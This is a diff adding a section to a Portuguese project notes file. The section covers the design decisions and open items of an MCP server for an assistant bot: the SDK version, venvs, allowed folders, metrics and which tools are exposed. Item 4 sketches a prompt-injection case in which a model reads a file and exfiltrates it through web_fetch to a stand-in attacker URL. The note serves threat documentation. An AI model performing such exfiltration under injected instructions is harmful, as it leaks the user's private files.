@@ -309,3 +309,48 @@ A especificação está em `docs/superpowers/specs/2026-11-08-acabamento-design.
    (manter `str.format`) estão desligados, com o motivo no `pyproject.toml`; o notebook do
    fine-tuning fica fora do lint. O `ruff format` não foi adotado (reformataria o projeto
    inteiro).
+
+## MCP (subprojeto 6)
+
+A especificação está em `docs/superpowers/specs/2026-11-08-mcp-design.md`; o guia em
+`docs/mcp.md`.
+
+1. **[PENDENTE] Nunca foi conectado a um Claude Desktop/Code de verdade.** Pedido explícito:
+   não mexer na configuração real da máquina. Validado com o cliente do próprio SDK (em
+   processo e por stdio, subindo `python -m jarvis.mcp_server`) e com uma rodada manual contra
+   o `.env` padrão. A primeira conexão real deve confirmar: o `PYTHONPATH` no bloco `env`, o
+   caminho do Python do `.venv-mcp` e as aprovações por ferramenta do cliente. O MCP Inspector
+   também não foi usado.
+2. **SDK fixado em `mcp==2.3.0`.** A 2.x mudou a API em relação à 1.x (servidor de baixo nível
+   com `on_list_tools`/`on_call_tool`, `mcp.Client`, campos em snake_case como `input_schema` e
+   `is_error`). O módulo não roda com a 1.x; atualizar exige rodar os testes do job `mcp`.
+3. **Dois Pythons.** O bot segue em 3.8 e o servidor MCP precisa de 3.10+, então quem usa os
+   dois mantém dois venvs (`.venv` e `.venv-mcp`). O arquivo `jarvis/mcp_server.py` tem sintaxe
+   3.8 para continuar no ruff com alvo `py38` e para a allowlist ser testada em 3.8. Quando o
+   bot sair do 3.8, os dois venvs podem virar um só.
+4. **[DECISÃO DA JÚLIA] `web_search` e `web_fetch` estão no padrão.** São leitura e o
+   `web_fetch` passa pelo `check_url` (SSRF), mas saem para a internet: junto com `read_file`,
+   um modelo vítima de prompt injection poderia tentar mandar o conteúdo de um arquivo numa
+   URL (`web_fetch("https://atacante/?q=...")`). O próprio cliente (Claude) já tem acesso à web,
+   então o risco extra é pequeno; para cortar, `JARVIS_MCP_TOOLS=read_file,list_dir,...`
+   sem as duas.
+5. **As pastas permitidas são as do bot.** O MCP usa `JARVIS_ALLOWED_ROOTS` (padrão: a home
+   inteira). Para um cliente MCP pode fazer sentido uma raiz menor; hoje isso se faz pelo bloco
+   `env` do cliente (o que vem do cliente vale mais que o `.env`). Não há uma variável
+   `JARVIS_MCP_ALLOWED_ROOTS` separada.
+6. **Métricas do MCP misturadas no `/metrics`.** As chamadas entram no mesmo
+   `metrics.sqlite3` com `source="mcp"`, modelo vazio e 0 iterações. As latências do `/metrics`
+   (p50/p95 por requisição) passam a incluir essas chamadas de ferramenta, que são muito mais
+   rápidas que uma conversa com o LLM; o `/metrics` não filtra por `source`. A rodada manual
+   desta noite gravou 3 linhas `mcp` no `data/metrics.sqlite3` desta máquina.
+7. **Erro detectado por prefixo.** Como no `ToolRegistry`, um resultado que começa com `Erro`
+   ou `Bloqueado` vira `isError: true`; ferramentas que avisam de outro jeito ("Informe o campo
+   'query'.", "Nada encontrado...") voltam como sucesso. Validação de entrada pelo JSON Schema
+   fica com o SDK/cliente; o handler continua tratando argumentos ruins.
+8. **Só stdio, só ferramentas.** Sem transporte HTTP (exigiria autenticação), sem recursos MCP
+   (ex.: notas como `resource://`) e sem prompts. `knowledge_index` fica fora do padrão: indexar
+   é escrita e pode ser pesado; o índice é construído pelo bot (`/reindex`) ou por
+   `scripts/reindex.py`.
+9. **Lembretes não entram.** O servidor monta o registro sem `ReminderService` (precisa do
+   agendador e do Telegram), então `reminder` não existe no MCP; `send_file` e `speak` são
+   recusadas sempre.
